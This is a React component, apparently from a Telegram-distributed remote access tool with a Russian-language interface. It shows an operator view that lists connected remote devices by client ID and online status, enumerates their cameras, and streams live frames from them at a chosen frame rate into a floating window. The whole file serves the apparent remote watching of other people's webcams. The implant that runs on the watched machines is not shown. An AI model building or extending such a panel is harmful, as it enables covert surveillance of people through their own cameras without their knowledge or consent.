// t.me/SentinelLinks

"use client"

import type React from "react"
import { useEffect, useRef, useState, useCallback } from "react"
import { WifiOff, Maximize2, X, Play, Square, Camera, RefreshCw } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import type { User } from "@/app/page"
import { toast } from "sonner"
import ReactDOM from "react-dom"

interface WebcamViewerProps {
  selectedUser: User | null
}

interface CameraDevice {
  id: string
  name: string
}

export function WebcamViewer({ selectedUser }: WebcamViewerProps) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const floatingRef = useRef<HTMLDivElement>(null)
  const [isConnected, setIsConnected] = useState(false)
  const [isStreaming, setIsStreaming] = useState(false)
  const [fps, setFps] = useState("15")
  const [isFloating, setIsFloating] = useState(false)
  const [position, setPosition] = useState({ x: 50, y: 50 })
  const [isDragging, setIsDragging] = useState(false)
  const [dragStart, setDragStart] = useState({ x: 0, y: 0 })
  const streamingRef = useRef(false)

  const [cameras, setCameras] = useState<CameraDevice[]>([])
  const [selectedCamera, setSelectedCamera] = useState<string>("")
  const [loadingCameras, setLoadingCameras] = useState(false)

// t.me/SentinelLinks
  const fetchCameras = useCallback(async () => {
    if (!selectedUser || selectedUser.status !== "online") return

// t.me/SentinelLinks
    setLoadingCameras(true)
    try {
      const response = await fetch(`/api/webcam/cameras?clientId=${selectedUser.id}`)
      if (response.ok) {
        const data = await response.json()
        if (data.cameras && Array.isArray(data.cameras)) {
          setCameras(data.cameras)
          // Auto-select first camera if none selected
          if (data.cameras.length > 0 && !selectedCamera) {
            setSelectedCamera(data.cameras[0].id)
          }
        }
      }
    } catch (error) {
      console.error("[v0] Failed to fetch cameras:", error)
      // Fallback: add default camera option
      setCameras([{ id: "0", name: "Default Camera" }])
      setSelectedCamera("0")
    } finally {
      setLoadingCameras(false)
    }
  }, [selectedUser, selectedCamera])

  // Fetch cameras when user is selected
  useEffect(() => {
    if (selectedUser?.status === "online") {
      fetchCameras()
    } else {
      setCameras([])
      setSelectedCamera("")
    }
  }, [selectedUser, fetchCameras])

  const fetchWebcamFrame = useCallback(async () => {
    if (!selectedUser || !streamingRef.current) return

    try {
      const cameraParam = selectedCamera ? `&cameraId=${selectedCamera}` : ""
      const response = await fetch(`/api/webcam?clientId=${selectedUser.id}${cameraParam}`)
      if (response.ok) {
        const data = await response.json()
        if (data.data) {
          const canvas = canvasRef.current
          if (canvas) {
            const ctx = canvas.getContext("2d")
            const img = new Image()
            img.crossOrigin = "anonymous"
            img.onload = () => {
              ctx?.drawImage(img, 0, 0, canvas.width, canvas.height)
            }
            img.src = `data:image/jpeg;base64,${data.data}`
          }
        }
      }
    } catch (error) {
      console.error("[v0] Webcam fetch error:", error)
    }
  }, [selectedUser, selectedCamera])

  useEffect(() => {
    streamingRef.current = isStreaming
  }, [isStreaming])

  useEffect(() => {
    if (!isStreaming || !selectedUser) return

    const interval = setInterval(fetchWebcamFrame, 1000 / Number.parseInt(fps))

    return () => clearInterval(interval)
  }, [isStreaming, selectedUser, fps, fetchWebcamFrame])

  useEffect(() => {
    if (selectedUser?.status === "online") {
      setIsConnected(true)
    } else {
      setIsConnected(false)
      setIsStreaming(false)
    }
  }, [selectedUser])

  const handleMouseDown = (e: React.MouseEvent) => {
    if (!isFloating) return
    setIsDragging(true)
    setDragStart({
      x: e.clientX - position.x,
      y: e.clientY - position.y,
    })
  }

  const handleMouseMove = (e: MouseEvent) => {
    if (!isDragging) return
    setPosition({
      x: e.clientX - dragStart.x,
      y: e.clientY - dragStart.y,
    })
  }

  const handleMouseUp = () => {
    setIsDragging(false)
  }

  useEffect(() => {
    if (isDragging) {
      window.addEventListener("mousemove", handleMouseMove)
      window.addEventListener("mouseup", handleMouseUp)
      return () => {
        window.removeEventListener("mousemove", handleMouseMove)
        window.removeEventListener("mouseup", handleMouseUp)
      }
    }
  }, [isDragging, dragStart])

  const toggleFloating = () => {
    setIsFloating(!isFloating)
  }

  const toggleStreaming = () => {
    if (!isStreaming) {
      setIsStreaming(true)
      streamingRef.current = true
      toast.success("Трансляция веб-камеры запущена")
    } else {
      setIsStreaming(false)
      streamingRef.current = false
      toast.info("Трансляция остановлена")
    }
  }

  const webcamContent = (
    <div className="relative rounded-lg overflow-hidden border bg-card shadow-lg">
      <div className="absolute top-3 left-3 z-10 flex gap-2 flex-wrap">
        <Button
          size="sm"
          variant={isStreaming ? "destructive" : "default"}
          onClick={toggleStreaming}
          className="gap-2 h-8 px-3"
        >
          {isStreaming ? (
            <>
              <Square className="w-3 h-3 fill-current" />
              <span className="text-xs font-medium">Stop</span>
            </>
          ) : (
            <>
              <Play className="w-3 h-3 fill-current" />
              <span className="text-xs font-medium">Start</span>
            </>
          )}
        </Button>

        <Select value={selectedCamera} onValueChange={setSelectedCamera} disabled={isStreaming}>
          <SelectTrigger className="w-[160px] h-8 bg-background/80 backdrop-blur-sm">
            <Camera className="w-3 h-3 mr-2" />
            <SelectValue placeholder={loadingCameras ? "Загрузка..." : "Выбрать камеру"} />
          </SelectTrigger>
          <SelectContent>
            {cameras.length === 0 ? (
              <SelectItem value="none" disabled>
                Камеры не найдены
              </SelectItem>
            ) : (
              cameras.map((camera) => (
                <SelectItem key={camera.id} value={camera.id}>
                  {camera.name}
                </SelectItem>
              ))
            )}
          </SelectContent>
        </Select>

        <Select value={fps} onValueChange={setFps}>
          <SelectTrigger className="w-[100px] h-8">
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="5">5 FPS</SelectItem>
            <SelectItem value="10">10 FPS</SelectItem>
            <SelectItem value="15">15 FPS</SelectItem>
            <SelectItem value="30">30 FPS</SelectItem>
          </SelectContent>
        </Select>

        <Button
          size="sm"
          variant="outline"
          onClick={fetchCameras}
          className="h-8 px-3 bg-transparent"
          disabled={loadingCameras}
        >
          <RefreshCw className={`w-3 h-3 ${loadingCameras ? "animate-spin" : ""}`} />
        </Button>
      </div>
      <div className="absolute top-3 right-3 z-10">
        <Button size="icon" variant="secondary" className="h-8 w-8" onClick={toggleFloating}>
          {isFloating ? <X className="w-3 h-3" /> : <Maximize2 className="w-3 h-3" />}
        </Button>
      </div>
      <canvas ref={canvasRef} width={1200} height={700} className="w-full h-auto bg-black" />
      <div className="absolute bottom-3 right-3 px-3 py-1.5 rounded-md bg-background/80 backdrop-blur-sm border text-xs font-mono flex items-center gap-2">
        {isStreaming ? (
          <>
            <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
            <span className="text-green-600 dark:text-green-400 font-semibold">LIVE</span>
          </>
        ) : (
          <>
            <span className="w-2 h-2 rounded-full bg-muted-foreground" />
            <span className="text-muted-foreground">PAUSED</span>
          </>
        )}
        <span className="text-border">•</span>
        <Camera className="w-3 h-3 text-accent" />
        <span>{cameras.find((c) => c.id === selectedCamera)?.name || "WEBCAM"}</span>
        <span className="text-border">•</span>
        <span className="text-muted-foreground">{selectedUser?.name || "N/A"}</span>
        <span className="text-border">•</span>
        <span className="text-muted-foreground">{fps} FPS</span>
      </div>
    </div>
  )

  if (isFloating && selectedUser) {
    return (
      <>
        <div className="flex-1 flex items-center justify-center bg-background">
          <div className="text-center">
            <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-accent/20 to-primary/20 flex items-center justify-center mx-auto mb-6">
              <Camera className="w-12 h-12 text-accent" />
            </div>
            <h3 className="text-xl font-semibold mb-2">Плавающий режим активен</h3>
            <p className="text-muted-foreground">Веб-камера отображается в плавающем окне</p>
          </div>
        </div>
        {typeof document !== "undefined" &&
          ReactDOM.createPortal(
            <div
              ref={floatingRef}
              className="fixed z-[9999] bg-background rounded-xl shadow-2xl"
              style={{
                left: `${position.x}px`,
                top: `${position.y}px`,
                width: "600px",
                cursor: isDragging ? "grabbing" : "grab",
              }}
            >
              <div
                className="p-2 bg-gradient-to-r from-accent to-primary rounded-t-xl cursor-grab active:cursor-grabbing"
                onMouseDown={handleMouseDown}
              >
                <p className="text-xs text-white font-semibold text-center flex items-center justify-center gap-2">
                  <Camera className="w-4 h-4" />
                  {selectedUser.name} - {cameras.find((c) => c.id === selectedCamera)?.name || "Веб-камера"}
                </p>
              </div>
              {webcamContent}
            </div>,
            document.body,
          )}
      </>
    )
  }

  if (!selectedUser) {
    return (
      <div className="flex-1 flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-accent/20 to-primary/20 flex items-center justify-center mx-auto mb-6">
            <Camera className="w-12 h-12 text-muted-foreground" />
          </div>
          <h3 className="text-xl font-semibold mb-2">Нет подключения</h3>
          <p className="text-muted-foreground">Выберите устройство из списка для просмотра веб-камеры</p>
        </div>
      </div>
    )
  }

// t.me/SentinelLinks
  if (selectedUser.status !== "online") {
    return (
      <div className="flex-1 flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-destructive/20 to-destructive/10 flex items-center justify-center mx-auto mb-6">
            <WifiOff className="w-12 h-12 text-destructive" />
          </div>
          <h3 className="text-xl font-semibold mb-2">Устройство недоступно</h3>
          <p className="text-muted-foreground">
            {selectedUser.name} в данный момент {selectedUser.status === "offline" ? "отключено" : "неактивно"}
          </p>
          <p className="text-sm text-muted-foreground mt-2">Последняя активность: {selectedUser.lastSeen}</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex-1 bg-background p-6 overflow-auto">
      <div className="max-w-7xl mx-auto">{webcamContent}</div>
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
